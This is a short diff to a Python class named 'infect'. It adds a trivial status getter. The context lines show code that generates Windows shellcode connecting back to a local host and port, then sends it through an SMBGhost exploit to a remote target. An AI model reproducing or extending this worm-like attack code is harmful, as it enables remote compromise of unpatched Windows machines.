@@ -35,6 +35,9 @@ class infect(threading.Thread):
 
         return bytes.fromhex((subprocess.check_output(msf_command, shell=True).decode('ascii')))
     
+    def get_status(self):
+        return self.status
+    
     def inject(self):
         shell = self.generate_windows_shellcode(self.lhost,self.lport)
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
